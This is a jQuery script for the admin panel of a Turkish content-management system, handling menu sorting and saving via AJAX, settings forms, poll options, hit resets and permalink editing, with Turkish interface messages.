/*
	Copyright © 2008 - 2012
	Energy Web Yazılım - İstanbul
	www.webtasarimx.net
	bilgi@webtasarimx.net
*/






/*
$(".x_left").each(function(i){
	myCars[i] = $(this).height();
	for (x = 0; x < myCars.length; x++){
		if (myCars[i] > myCars[x]) {
			yedek = myCars[x]
			myCars[x] = myCars[i]
			myCars[i] = yedek
		}
	}
})
.each(function(i){
	$(this).css("height", myCars[0])
})
alert(myCars.join())
*/



/*
$(window).load(function() {
	tinyMCE.init({directionality : "rtl"});
});

*/
//$("*").css("direction", "rtl")






$(document).ready(function() {
	// Global

	/* Sistem Mesaj */
	var sysMsg = $("#system-message");
	sysMsg.bind(".close").live("click", function() {
		$(this).animate({
			top: "-20px",
			opacity: 0
		}, 800)
		.end()
		.addClass("hidden");
	});


	var $sbmt = $("button, form");
	if ($sbmt.length > 0) {
		$sbmt.live("click submit", function(e) {
			//$(this).autocomplete("destroy");
			window.onbeforeunload = null;
		});
	}




	var $inputKeys = $("input[type=text], input[type=password], textarea");
	if ($inputKeys.length > 0) {
		$inputKeys.keypress(function() {
			before_unload();
		});
	}





	/* ie7 outline fix */
	var LinkBlur = $(".ie7 a:not(.selectBox), .ie7 input:checkbox, .ie7 input:radio, .ie7 input:submit, .ie7 input:button, .ie7 input:reset")
	if (LinkBlur.length > 0) {
		LinkBlur.live("focus", function() {
			if (this.blur) this.blur();
		});
	}

	var ie7Focus = $(".ie7 .inputbox, .ie7 select, .ie7 textarea");
	if (ie7Focus.length > 0){
		ie7Focus.live("focusin", function() {
			$(this).addClass("focus")
		});
		ie7Focus.live("focusout", function() {
			$(this).removeClass("focus")
		});
	}




	var selectBoxs = $("select");
	if (selectBoxs.length > 0){
		selectBoxs.selectBox();
	}





	// Toggle Checkbox Checked
	$.fn.toggleChecked = function() {
		this.attr("checked", !this.attr("checked"));
	}



	/* Colorbox window */
/*
	var cBoxDrag = $("#colorbox");
	if(cBoxDrag.length>0) {
		cBoxDrag.draggable({ iframeFix: true, cursor: "move" }).disableSelection();
	};
*/
	var colorbox1 = $(".iframe");
	if(colorbox1.length > 0){ colorbox1.colorbox({iframe:true, innerWidth:803, innerHeight:435}) }

	var colorbox2 = $(".iframe2");
	if(colorbox2.length > 0){ colorbox2.colorbox({iframe:true, innerWidth:900, innerHeight:455}) }

	var colorbox3 = $(".iframe-pagebreak");
	if(colorbox3.length > 0){ colorbox3.colorbox({iframe:true, innerWidth:400, innerHeight:50}) }

	/* Picture Show */
    if ($("a[rel='img-show']").length > 0) {
        $("a[rel='img-show']").colorbox({transition: "elastic"});
    }
	function cb_img_each(id) {
		$.each(id, function(key) {
			$(this).colorbox();
			$.colorbox.close();
		});
	}



	/* Jquery Accordion */
	var acord1 = $("#accordion");
	if(acord1.find("> h3").length > 1){ acord1.accordion() }





/*
	var $boxs = $(".maincolumn");
	if($boxs.find(".boxs").length > 1){ $boxs.masonry({ itemSelector: ".boxs" }); }
*/





	/* Jquery Tabs */
	var $ewyTabs = $("#tabs");
	//if($ewyTabs.find("ul > li").length > 1){ $ewyTabs.tabs({ fx: { width: 'toggle', opacity: 'toggle'} }) }
	if($ewyTabs.find("ul > li").length > 1){ $ewyTabs.tabs(); }











	/* Tooltip işlemleri */
/*
	var $ewyTips1 = $(".tooltip:not(.icons), .tooltip-text");
	if($ewyTips1.length > 0){
		$ewyTips1.tipTip({
			edgeOffset: 1,
			defaultPosition: "top"
		})
		.click(function(e){
			if($(this).attr("href") === "#") {
				e.preventDefault();
			}
		});
	}


	var $ewyTips2 = $("ul .icons.tooltip span");
	if($ewyTips2.length > 0){
		$ewyTips2.tipTip({
			edgeOffset: 1,
			defaultPosition: "top"
		});
	}
*/


	$(".tooltip:not(.icons), .tooltip-text").tooltip({
		position: {
			my: "center top",
			at: "center bottom"
		},
		show: {
			duration: "fast"
		},
		hide: {
			effect: "hide"
		}
	})
	.live("click", function(e){
		if($(this).attr("href") == "#") {e.preventDefault()}
	});










	/* Enter Click to Submit Form */
	var $ewySearch = $("#search");
	if($ewySearch.length > 0){
		$ewySearch.keypress(function(e){
			if(e.which == 13) {
				window.onbeforeunload = null;
				this.form.submit();
			}
		});
	}




	var $tE = $("input.etiketler");
	if($tE.length > 0) {
		$tE.tagEditor({
		url: "?mod=redirect&task=etiket_autocomplete", 
		param: "q",
		method: "post",
		suggestChars: 2,
		tagMaxLength: 40
		});
	}





	//window.onbeforeunload = null;
	//before_unload();



/********************************* Menü Sayfası ***************************/

	if(GlobalModValue === "menu") {
		$("#menu_toggle_custom").attr("style", $.cookie("menu_toggle_custom"));
		$("#menu_toggle_page").attr("style", $.cookie("menu_toggle_page"));
		$("#menu_toggle_categories").attr("style", $.cookie("menu_toggle_categories"));
		$("#menu_toggle_products").attr("style", $.cookie("menu_toggle_products"));
	}



	function MenuColumnHeight() {
		var r = $(".menurightbar"), l = $(".menuleftbar");
		if(r.length > 0 && l.length > 0) {
			if(parseInt(l.height()) > parseInt(r.height())) {
				//l.css("min-height", "");
				r.css("min-height", l.height());
			} else {
				//r.css("min-height", "");
				l.css("min-height", r.height());
			}
		}
	}



	function enable_input(i) {
		// enable text select on inputs
		if(i.length > 0) {
			i.find("input")
				.bind('mousedown.ui-disableSelection selectstart.ui-disableSelection', function(e) {
				e.stopImmediatePropagation();
				//e.preventDefault();
			});
		}
	}



	var _nST = $("#menu_sortable");
	if(_nST.length > 0) {
		_nST
		.nestedSortable({
			listType: "ul",
			//containment : "parent",
			disableNesting: "no-nest",
			errorClass: "ui-nestedSortable-error",
			forcePlaceholderSize: true,
			cancel : ".on_off",
			handle: ".handle",
			placeholder: "ph",
			helper: "clone",
			cursor: "move",
			items: "li:not(.static)",
			opacity: .6,
			maxLevels: 10,
			revert: 250,
			axis:false,
			scroll:true,
			scrollSensitivity: 40,
			tabSize: 20,
			tolerance: "pointer",
			toleranceElement: ".postbox",
			sort: function(e, ui) {},
			start: function(e, ui) {
				//alert($(window).scrollTop() + " " + $(document).height())
				//$(window).scrollTop($(window).scrollTop()+15);

				MenuColumnHeight();

				Messages("loading", "Menü sıralaması ayarlanıyor...");
				ui.placeholder.css("height", (parseInt(ui.item.height()) - (parseInt(ui.placeholder.css("border-width"))*2)-10) );
				ui.helper.css("top", parseInt(ui.helper.css("top"))-10);
				_nST.nestedSortable("refreshPositions")

				before_unload();
				//ui.placeholder.html("I'm modifying the placeholder element!");
				
			},
			update: function(e, ui) {
				var parentid = ui.item.parent().parent().attr("id").replace("menuid_", "")
				if(parentid == "menu_list") {parentid = 0} //alert(parentid)
				ui.item.find("input[name=menu_anaid]").val(parentid);
			},
			stop: function (event, ui) {
				Messages("warning", "Menü sıralaması ayarlandı, işlemim gerçekleşmesi için kaydet butonuna basın.");
				//$(".menuleftbar").height("auto");
				//$(".menurightbar").height("auto");
				enable_input(_nST);
			}
		}).disableSelection();
	};
	enable_input(_nST);




	$("#listmenu_save").click(function(e){
		e.preventDefault();
		//alert(_nST.nestedSortable("serialize")); return false;
		if(_nST.nestedSortable("serialize") == "") {Messages("error", "Hiç menü oluşturulmamış.");return false;}
		//$("#test").html(_nST.nestedSortable("serialize")); return false;
		/*
		var serial = [];
		$.each(_nST.nestedSortable("serialize").split("&"), function(key, u) {
			//alert(/menuid\[\d+\]=(.+)/.exec(u)[1]);
			serial[key] = "id=" + /menuid\[(\d+)\]/.exec(u)[1] + "&pid_"+ /menuid\[(\d+)\]/.exec(u)[1] +"=" + /menuid\[\d+\]=(.+)/.exec(u)[1].replace("root", "0");
		});
		// alert(serial.join("&"))
		*/

		$.ajax({
			cache: false,
			type: "POST",
			url: "index.asp?mod=redirect&task=listmenu_save" + GlobalDebug,
			data: _nST.nestedSortable("serialize"),
			beforeSend: function() {
				Messages("loading", "Menü sıralamsı kaydediliyor, lütfen bekleyin.");
			},
			error: function(xhr, ajaxOptions, thrownError) {
				ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
			},
			success: function(veri) {//alert(veri)
				if (veri === "ok") {
					setTimeout(function() {
						Messages("success", "Menü sıralaması başarıyla kaydedildi.");
					}, 1000);
					$(".menuleftbar").height("auto");
					$(".menurightbar").height("auto");
				}
			}
		});
		window.onbeforeunload = null;
	});












	$(".menu_remove").live("click", function(e){
		e.preventDefault();
		var $this = $(this),
		$thisid = $this.attr("id").replace("menu_remove_", "").replace("menu_remove2_", "");
		$.ajax({
			cache: false,
			dataType: "json",
			contentType: "application/x-www-form-urlencoded; charset=UTF-8",
			type: "POST",
			url: "index.asp?mod=redirect&task=menu_remove&id=" + $thisid + GlobalDebug,
			data: {},
			beforeSend: function() {
				Messages("loading", "Menü kaydediliyor, lütfen bekleyin.");
			},
			error: function(xhr, ajaxOptions, thrownError) {
				ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
			},
			success: function(o) {//alert(o)
				setTimeout(function() {
					$this.animate({
						opacity : .3
					}, 500, function(){ $("#menuid_" + $thisid).slideUp(500, function(){ $(this).remove() }) });
					Messages(o.cssClass, o.Msg);
					MenuColumnHeight();
				}, 500)
			}
		});
	});





	$(".EnergyAddMenu").live("submit", function(e) {
		e.preventDefault();

		var $this = $(this);
		var $data = $this.attr("data_turu");

		Messages("loading", "Menü ekleniyor, lütfen bekleyin.");
		if($data == "page" || $data == "kategori" || $data == "urun") {
			$this.find("input:not([checked])").attr("disabled", "disabled")
			$this.find("input:checked").parent().parent().find("input").removeAttr("disabled");

			$.each($this.find("input:checked"), function(key, u) {
				$(this).parents("li").find("input").removeAttr("disabled");
				//alert(/menuid\[\d+\]=(.+)/.exec(u)[1]);
				//serial[key] = "id=" + /menuid\[(\d+)\]/.exec(u)[1] + "&pid_"+ /menuid\[(\d+)\]/.exec(u)[1] +"=" + /menuid\[\d+\]=(.+)/.exec(u)[1].replace("root", "0");
			});
		}
		$this.find(".loading_img").css("display", "inline");

		if(($data == "page" || $data == "kategori" || $data == "urun") && $this.find(":checkbox[checked]").length == 0) {
			setTimeout(function() {
				Messages("error", "Menüyü oluşturabilmemiz için en az bir kayıt seçmelisiniz.");
				//alert("Menüyü oluşturabilmemiz için en az bir kayıt seçmelisiniz.");
				$this.find(".loading_img").css("display", "none");
			}, 800);
			return false;
		}

		if(($data != "page" || $data != "kategori" || $data != "urun") && ($this.find("input[name=menu_url]").val() == "" || $this.find("input[name=menu_url]").val() == "http://")) {
			setTimeout(function() {
				Messages("error", "Lütfen geçerli menü için bir url girin.");
				//alert("Lütfen geçerli menü için bir url girin.");
				$this.find(".loading_img").css("display", "none");
			}, 800);
			return false;

		} else if(($data != "page" || $data != "kategori" || $data != "urun") && $this.find("input[name=menu_tag]").val() == "") {
			setTimeout(function() {
				Messages("error", "Lütfen geçerli menü için bir etiket girin.");
				//alert("Lütfen geçerli menü için bir etiket girin.");
				$this.find(".loading_img").css("display", "none");
			}, 800);
			return false;
		} 

		//$("#test").html($this.serialize()); return false;
		$.ajax({
			cache: false,
			dataType: "json",
			contentType: "application/x-www-form-urlencoded; charset=UTF-8",
			type: $this.attr("method"),
			url: $this.attr("action"),
			data: $this.serialize(),
			beforeSend: function() {
				Messages("loading", "Menü kaydediliyor, lütfen bekleyin.");
			},
			error: function(xhr, ajaxOptions, thrownError) {
				ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
			},
			success: function(o) {
				//$("#test").html(o); return false;
				$.each(o.menu_list, function(k, d) {
					if ($data != "list") {
						var html = "";
						html = menu_items(d.m_parent, html)
							.replace(/\{0\}/gi, d.m_id)
							.replace(/\{anaid\}/gi, d.m_anaid)
							.replace(/\{tag\}/gi, d.m_tag)
							.replace(/\{tag2\}/gi, str_len(d.m_tag, 50))
							.replace(/\{title\}/gi, d.m_title)
							.replace(/\{text\}/gi, d.m_text)
							.replace(/\{url\}/gi, d.m_url)
							.replace(new RegExp("\\{check" + d.m_target + "\\}", "gi"), "checked=\"checked\"")
							.replace(/\{rel\}/gi, d.m_rel)
							.replace(/\{class\}/gi, d.m_class)
							.replace(/\{style\}/gi, d.m_style)
							.replace(/\{parent\}/gi, d.m_parent)
							.replace(/\{parentid\}/gi, d.m_parentid)
							.replace(/\{lang\}/gi, d.m_lang)
							.replace(/\{(.*?)\}/gi, "")
						;
					}

					_nST.find(".warning").slideUp(800);
					if ($data == "list") {
						_nST.append(html);

					} else if (d.m_parent === 1 && _nST.find(".warning").length == 0) {
						_nST.prepend(html).find("#menuid_" + d.m_id).hide().delay(800).slideDown(800);

					} else {
						_nST.append(html).find("#menuid_" + d.m_id).hide().delay(800).slideDown(800);
					}
				});

				enable_input(_nST);
				MenuColumnHeight();
	
				setTimeout(function() {
					Messages(o.msg_class, o.msg_text);
					$this.find(".loading_img").css("display", "none");
				}, 1000);
			}
		});

		setTimeout(function() {
			$this.find(".loading_img").css("display", "none");
		}, 800);

		if($data == "page" || $data == "kategori" || $data == "urun") {
			$this.find("input:checkbox").removeAttr("checked");
			$this.find("input").removeAttr("disabled");
		}
		window.onbeforeunload = null;
	});








	function menu_items(parent, html) {
		//alert(parent)
		var MenuTuru = "";
		if(parent == 0) {
			MenuTuru = "Özel";

		} else if(parent == 1) {
			MenuTuru = "Ana Sayfa";

		} else if(parent == 2) {
			MenuTuru = "Sayfa";

		} else if(parent == 3) {
			MenuTuru = "Kategori";

		} else if(parent == 4) {
			MenuTuru = "Ürün";

		} else if(parent == 5) {
			MenuTuru = "Banner";

		} else if(parent == 6) {
			MenuTuru = "Anket";

		} else {
			MenuTuru = "Bilinmiyor";
		}
		html += '<li id="menuid_{0}">';
			html += '<form id="EnergyMenuList_{0}" class="EnergyAddMenu" data_turu="list" action="?mod=list_post&amp;task=menu&amp;menutype=' + GlobalMenuType + GlobalDebug + '" method="post">';
			html += '<div class="postbox" style="width:450px;">';
				html += '<div class="handle clearfix">';
					html += '<div class="on_off" title="Göster / Gizle" onclick="$(\'#menu_toggle_{0}\').toggle(\'blind\', 600); $(this).toggleClass(\'active\'); return false;">&nbsp;</div>';
					html += '<h3 class="h3_title" title="{tag}">';
						html += '<a id="menu_remove2_{0}" class="menu_remove" href="#" title="Bu Menüyü Sil"><i class="hidden">Sil</i></a>';
						html += '<span style="color:#f00;">' + MenuTuru + '</span>';
						html += '{tag2}';
					html += '</h3>';
				html += '</div>';
				html += '<div class="menu_body clearfix">';
					html += '<div id="menu_toggle_{0}" class="menu_content hidden">';
					if(parent == 0) {
						html += '<div class="rows clearfix">';
							html += '<label class="lb" for="menu_url_{0}" title="Örneğin: &quot;http://www.webtasarimx.net/&quot; şeklinde bir bağlantı girmelisiniz. — &quot;http://&quot; veya &quot;https://&quot; protokolünü yazmayı unutmayın.">';
								html += '<span class="menu_text">Navigasyon URL\'si</span>';
								html += '<input name="menu_url" id="menu_url_{0}" value="{url}" class="inputbox" type="text" onblur="if($(this).val() == \'\') $(this).val(\'http://\').css(\'color\', \'#aaa\');" onfocus="if($(this).val() == \'http://\') $(this).val(\'\').css(\'color\', \'#2F3032\');" />';
							html += '</label>';
						html += '</div>';
					} else {
						html += '<div class="rows clearfix">';
							html += '<span class="menu_text" title="Orjinal bağlantıları değiştirmek için geçerli kaydı düzenleme sayfasına gidin.">Orjinal Bağlantı</span>';
							html += '<a class="private_link" href="{url}" target="_blank" title="{tag}">{tag2}</a>';
						html += '</div>';
					}
						html += '<div class="rows clearfix">';
							html += '<label class="lb" for="menu_tag_{0}" title="Örneğin: &quot;Energy Web Tasarım&quot; şeklinde bir bağlantı etiketi girebilirsiniz.">';
								html += '<span class="menu_text">Navigasyon Etiketi</span>';
								html += '<input name="menu_tag" id="menu_tag_{0}" value="{tag}" class="inputbox" type="text" />';
							html += '</label>';
						html += '</div>';
						html += '<div class="rows clearfix">';
							html += '<label class="lb" for="menu_title_{0}" title="Kullanıcı fareyi bağlantı üzerine getirdiğinde tercihinize bağlı olarak bağlantının üzerinde ya da altında gözükecektir. Boş bırakıldığında &quot;Navigasyon Etiketi&quot; geçerli olacaktır.">';
								html += '<span class="menu_text">Title Özniteliği</span>';
								html += '<input name="menu_title" id="menu_title_{0}" value="{title}" class="inputbox" type="text" />';
							html += '</label>';
						html += '</div>';
						html += '<div class="rows clearfix">';
							html += '<label class="lb" for="menu_private_text_{0}" title="Web tasarımınız destekliyorsa, açıklama menüde görüntülenir.">';
								html += '<span class="menu_text">Özel Açıklama <i title="Opsiyonal">(ops.)</i></span>';
								html += '<input name="menu_private_text" id="menu_private_text_{0}" value="{text}" class="inputbox" type="text" />';
							html += '</label>';
						html += '</div>';
						html += '<div class="rows clearfix">';
							html += '<span class="menu_text" title="Bağlantının açılacağı hedef çerçeveyi seçin.">Navigasyon Hedefi</span>';
							html += '<span class="menu_text" style="width:310px;">';
								html += '<label for="menu_target_{0}_1" title="Aynı pencere ya da sekmede açılır.">';
									html += 'target=&quot;&quot;';
									html += '<input name="menu_target" id="menu_target_{0}_1" type="radio" value="0" {check0} class="radioMargin" />';
								html += '</label>&nbsp;';
								html += '<label for="menu_target_{0}_2" title="Yeni pencerede ya da sekmede açılır.">';
									html += 'target=&quot;_blank&quot;';
									html += '<input name="menu_target" id="menu_target_{0}_2" type="radio" value="1" {check1} class="radioMargin" />';
								html += '</label>&nbsp;';
								html += '<label for="menu_target_{0}_3" title="Frameli sayfalarda ana pencerede açılır.">';
									html += 'target=&quot;_top&quot;';
									html += '<input name="menu_target" id="menu_target_{0}_3" type="radio" value="2" {check2} class="radioMargin" />';
								html += '</label>';
							html += '</span>';
						html += '</div>';
						html += '<div class="rows clearfix">';
							html += '<label class="lb" for="menu_rel_{0}" title="Örneğin arama motorlarının eklediğiniz bir bağlantıyı takip etmesini engellemek için &quot;nofollow&quot; değerini girebilirisiz.">';
								html += '<span class="menu_text">Bağlantı İlişkisi <i title="Opsiyonal">(ops.)</i></span>';
								html += '<input name="menu_rel" id="menu_rel_{0}" value="{rel}" class="inputbox" type="text" />';
							html += '</label>';
						html += '</div>';
						html += '<div class="rows clearfix">';
							html += '<label class="lb" for="menu_class_{0}" title="Menü için özel bir sınıf belirlenmiş ise buraya sınıf adını girin.">';
								html += '<span class="menu_text">CSS Sınıf <i title="Opsiyonal">(ops.)</i></span>';
								html += '<input name="menu_class" id="menu_class_{0}" value="{class}" class="inputbox" type="text" />';
							html += '</label>';
						html += '</div>';
						html += '<div class="rows clearfix">';
							html += '<label class="lb" for="menu_style_{0}" title="Menü için özel bir stil belirlemek istiyorsanız buraya css stilini girin.">';
								html += '<span class="menu_text">CSS Stil <i title="Opsiyonal">(ops.)</i></span>';
								html += '<input name="menu_style" id="menu_style_{0}" value="{style}" class="inputbox" type="text" />';
							html += '</label>';
						html += '</div>';
						html += '<div class="rows submit_btn clearfix">';
							html += '<span class="a">';
								html += '<img class="loading_img" src="' + GlobalPath + 'images/loading.gif" alt="Lütfen Bekleyin..." />';
								html += '<span class="ie_btn"><input type="submit" class="addUrlSubmit btn" value="Menüyü Kaydet" /></span>';
							html += '</span>';
							html += '<span class="b">';
								html += '<a id="menu_remove_{0}" class="menu_remove" href="#" title="Bu Menüyü Sil">Menüyü Sil</a>';
							html += '</span>';
						html += '</div>';
						html += '<div class="clr"></div>';
					html += '</div>';
					html += '<div class="clr"></div>';
				html += '</div>';
			html += '</div>';
			html += '<input type="hidden" name="id" value="{0}" />';
			html += '<input type="hidden" name="menu_anaid" value="{anaid}" />';
			html += '<input type="hidden" name="menu_lang" value="{lang}" />';
			html += '<input type="hidden" name="menu_parent" value="{parent}" />';
			html += '<input type="hidden" name="menu_parentid" value="{parentid}" />';
			
			html += '</form>';
		html += '</li>';

		return html;
	}


//.fadeOut(1000)
	$("#settings").click(function(e){
		e.preventDefault();
		var $href = $(this).attr("href");
		var $title = $(this).attr("title");
		$.colorbox({href:$href, title:$title, iframe:true, innerWidth:803, innerHeight:435});
	});

	$(".SettingsSaveChange").live("change", function() {
		var $id = $(this).attr("id").replace("ewyid__", "").replace("ewyid_", "");
		var $name = $(this).attr("name");
		var sval = $(this).val();
		$.ajax({
			cache: false,
			type: "POST",
			url: "?mod=" + GlobalModValue + "&task=save&id=" + $id + GlobalDebug,
			data: {"name":$name, "val":sval},
			beforeSend: function() {
				window.parent.Messages("loading", "Ayarlar düzenleniyor, lütfen bekleyin.");
			},
			error: function(xhr, ajaxOptions, thrownError) {
				window.parent.ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
			},
			success: function(msg) {
				setTimeout(function() {
					window.parent.Messages("success", "Ayarlar düzenlendi.");
					
				}, 800);
			}
		});
	});




	$("#SubmitSave").live("click", function(e) {
		e.preventDefault();
		$("#submitForm").submit();
	});

	$("#submitForm").live("submit", function(e) {
		e.preventDefault();
		var $this = $(this);
		//var $id = $(this).attr("id").replace("ewyid__", "").replace("ewyid_", "");
		//var $name = $(this).attr("name");
		//var sval = $(this).val();
		//alert($this.serialize()); return false;
		$.ajax({
			cache: false,
			//dataType: "json",
			contentType: "application/x-www-form-urlencoded; charset=UTF-8",
			type: $this.attr("method"),
			url: $this.attr("action"),
			data: $this.serialize(),
			beforeSend: function() {
				window.parent.Messages("loading", "Ayarlar düzenleniyor, lütfen bekleyin.");
			},
			error: function(xhr, ajaxOptions, thrownError) {
				window.parent.ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
			},
			success: function(msg) {
				setTimeout(function() {
					window.parent.Messages("success", "Ayarlar düzenlendi.");
					
				}, 800);
				$("textarea[name=imageText_TR]").val(msg)
			}
		});
	});











	/* tinyMCE Editör Toggle */
	$("a.editor").click(function(e) {
		e.preventDefault();
		var eid = $(this).attr("id").replace("editor_id", ""),
		tEditor = "Editöre Dön", tHtml = "Html Göster";
		if ($(this).text() == tHtml) {
			$(this).attr("title", tEditor).text(tEditor);
		} else {
			$(this).attr("title", tHtml).text(tHtml);
		}
		tinyMCE.execCommand("mceToggleEditor", false, "text" + eid);
		return false;
	});









	/* Özel sayfa veya ürünler için */
	$("input[name='ozel']").click(function() {
		if (eval($(this).val()) < 2) {
			$("#pass-div").slideUp("fast");
			//$("label[for='pass'].error").slideUp("fast");

		} else if (eval($(this).val()) == 2) {
			$("#pass-div").slideDown("fast");

		}
	});






	/* Özel sayfa veya ürünler için */
	$("#menu").change(function() {
		if (eval($(this).val()) > 0) {
			$("#menuTitles").slideDown("fast");
			//$("label[for='pass'].error").slideUp("fast");

		} else if (eval($(this).val()) == 0) {
			$("#menuTitles").slideUp("fast");

		}
	});





/*

	$("input#energy_upload_file_button").live("click", function(){
		var lang_id = $("div#tabs li.ui-tabs-selected.ui-state-active").attr("id").replace("editorid_", "");
		//$.cookie("locale_lang", lang_id, {expires:7});
		$.cookie("locale_lang", lang_id);
		//$.cookie("locale_id", $("input#pageid").val());
	});
*/



	$("#tabs a[rel='languages']").bind("click", function(e){
		e.preventDefault();
		var $LangCode = $(this).attr("href").replace("#tabs_", "");
		//alert($LangCode);

		$("#other_files .other_files").addClass("hidden");
		$("#other_files_" + $LangCode).removeClass("hidden");

		$.cookie("locale_lang", $LangCode);
		//$.cookie("locale_lang", lang_id, {expires:7});
		//$.cookie("locale_id", $("input#pageid").val());
	});






	$("input.fileButton").live("click", function(){
		var $tabsLi = $("div#tabs li.ui-tabs-selected.ui-state-active");
		if($tabsLi.length > 0) {
			var $LangCode = $tabsLi.attr("id").replace("editorid_", "");
			//alert($LangCode);
			$("#other_files .other_files").addClass("hidden");
			$("#other_files_" + $LangCode).removeClass("hidden");
			$.cookie("locale_lang", $LangCode);
			//$.cookie("locale_lang", lang_id, {expires:7});
			//$.cookie("locale_id", $("input#pageid").val());
		}
	});















	/* Ürün sayfası td yüksekliğini div e eşitle */
	$(window).load(function(){
		$(".tdHeight").each(function() {
			$(this).find(".divHeight").css("height", $(this).height() + "px");
		});
	});



















/*
############################## Sayfa Hit Sıfırlama Ayarları ##############################
*/



	/* Hit Sıfırlama */
	$("a.hit_reset").click(function(e) {
		e.preventDefault();
		if(confirm("Dikkat!\nHit değerini gerçekten sıfırlamak istiyor musunuz?")) {
			var hit_reset_id = /hit_reset\[(\d+)\]/.exec($(this).attr("id"))[1]; //alert(hit_reset_id);
			//hit_input_id = $("input#hit_" + hit_reset_id);
			$.ajax({
				cache: false,
				type: "POST",
				url: $(this).attr("href") + GlobalDebug,
				data: {},
				error: function(xhr, ajaxOptions, thrownError) {
					//$.colorbox({title: "Hay aksi! işlem yapılırken bir hata oluştu.", html: xhr.responseText});
					ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
				},
				success: function(o) {
					$("input#hit_" + hit_reset_id).empty().val(o).fadeIn(500);
				}
			});
			$(this).parent().remove();
			return false;
		}
	});

















/*
############################## Anket Seçenek Ayarları ##############################
*/


	/* Anket seçenek ekleme */
	$("#secenek_ekle").click(function(e){
		e.preventDefault();
		var sCount = "sCount",
		sForm = "#anketSecenek",
		iCount = 0,
		maxlimit = 15,
		say = parseInt( $("#" + sCount).val() ),
		html = '';

		var secenek_input = $("input[name='secenekid[]']");
		for (i=1;i<=secenek_input.length;i++){
			secenek_input.eq(i-1).attr("id", "secenekid_"+ i);
			//$("label[for='secenek" + i + "']").eq(i-1).html('<span>:</span>Seçenek [' + i + ']');
		}

		if (say == maxlimit){
			alert("Toplam " + say + " seçenek ekleyebilirsiniz.");
			//$.colorbox({html:'<p class=\"messages warning\">Toplam <span class=\"red\">'+ say +'</span> seçenek ekleyebilirsiniz.</p>'})
		} else {
			iCount = say + 1;
			html += '<div class="row">';
				html += '<div class="l"><label for="secenek_title_' + (iCount) + '"><span>:</span>Seçenek ' + (iCount) + '';if (say < 2){ html += '<em class="red"> *</em>'; }html += '</label></div>';
				html += '<div class="r">';
					html += '<span class="relative">';
						html += '<input style="width:82%;" class="inputbox title required" name="secenek_title[]" id="secenek_title_' + (iCount) + '" value="" maxlength="100" type="text" />';
						//html += '<span><a class="tooltip secenek_sil" id="secenek_id[214]" tabindex="-1" href="#" title="Seçeneği sil">Sil</a></span>';
					html += '</span>';
					html += '<span class="relative">';
						html += '<input style="width:7%;" class="inputbox" name="hit[]" id="hit_' + (iCount) + '" value="0" type="text" />';
						html += '<span>&nbsp;</span>';
					html += '</span>';
					html += '<a class="tooltip" title="Anket için seçenekler giriniz. Maksimun 100 karekter.">&nbsp;</a>';
				html += '</div>';
				html += '<div class="clr"></div>';
			html += '</div>';
			$( sForm ).append(html);
			$( sForm ).parents("form").append('<input id="secenekid_' + (iCount) + '" name="secenekid[]" value="0" type="hidden" />\n');
			document.getElementById( sCount ).value ++;
		}
	});



	/* Anket seçenek silme */
	$(".secenek_sil").live("click", function(e){
		e.preventDefault();
		if(confirm("Bu Seçenek Kalıcı Olarak Silinsin mi?")) {
			sysMsg.animate({
				top: 0,
				opacity: 1
			}, 800, function() {
				$(this).slideDown( 1000 );
			});

			//var secenek_id = $(this).attr("id").replace("secenek_sil_", "");
			var secenek_id = /secenek_id\[(\d+)\]/.exec($(this).attr("id"))[1];
			var xsecenek_id = /secenek_title_(\d+)/.exec($(this).parent().parent().find("> input").attr("id"))[1];
			//alert($("#secenekid_" + xsecenek_id).val());

			var parent = $(this).parents(".row");

			$.ajax({
				cache: false,
				type: "POST",
				url: "index.asp?mod=redirect&task=secenek_sil&id=" + secenek_id + GlobalDebug,
				data: {},
				beforeSend: function() {
					Messages("loading", "Seçenek siliniyor, lütfen bekleyin.");
				},
				error: function(xhr, ajaxOptions, thrownError) {
					//$.colorbox({title: "Hay aksi! işlem yapılırken bir hata oluştu.", html: xhr.responseText});
					ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
				},
				success: function(veri) {
					if(veri === "ok"){
						setTimeout(function(){
							Messages("success", "Seçenek başarıyla silindi.");
							parent.slideUp("blind", function(){ $(this).remove(); $("#secenekid_" + xsecenek_id).remove(); });
						}, 800);
						document.getElementById("sCount").value --;

					}

				}
			});
		}
		
	});








/*
############################## Permalink Ayarları ##############################
*/

	$(".url_list").live("click", function(e){
		e.preventDefault();
		var $Url = $(this).attr("href");
		var $Title = $(this).attr("data-title");
		$.colorbox({title: "Permalink Ekle / Düzenle", href: $Url, width: 800, innerHeight:400, iframe:true});
	});



	function urlHtml() {
		var html = '';
		html += '<div class="row clearfix">';
			html += '<div class="l"><label for="url_{id}"><span>:</span>Permalink #{count}</label></div>';
			html += '<div class="r" style="overflow:hidden;">';
				html += '<div style="float:right; width:13%; height:30px; margin-left:5px; padding-top:5px;">';
					html += '<a id="url_status[{id}]" class="url_status list-passive-icon noClick" style="float: right; margin-left:10px;" href="?mod=redirect&amp;task=url_status&amp;id={id}&amp;parent={parent}&amp;parent_id={parentid}' + GlobalDebug + '" title="Varsayılan bağlantı yap">Varsayılan bağlantı yap</a>';
					html += '<a id="url_save[{id}]" class="url_save" style="float: right; margin-left:5px;" href="?mod=redirect&amp;task=url_save&amp;id={id}&amp;parent={parent}&amp;parent_id={parentid}' + GlobalDebug + '" title="Bağlantı kaydet">Bağlantı kaydet</a>';
				html += '</div>';
				html += '<div style="float:left; width:84%; height:30px;">';
					html += '<input style="width:100%;" class="inputbox" id="url_{id}" value="{val}" autocomplete="off" type="text" />';
				html += '</div>';
			html += '</div>';
		html += '</div>';
		return html;
	}



	$("#addNewLink").live("click", function(e){
		e.preventDefault();
		var $this = $(this);
		$this.parents(".m_box")
		.find(".form-table")
		.append(
			urlHtml()
			.replace(/\{id\}/gi, "0")
			.replace(/\{parent\}/gi, $this.attr("data-parent"))
			.replace(/\{parentid\}/gi, $this.attr("data-parentid"))
			.replace(/\{val\}/gi, "")
			.replace(/\{count\}/gi, $this.parents(".m_box").find(".row").length+1)
		);

	});


	$(".url_status.noClick, .url_status.list-active-icon").live("click", function(e){e.preventDefault();});
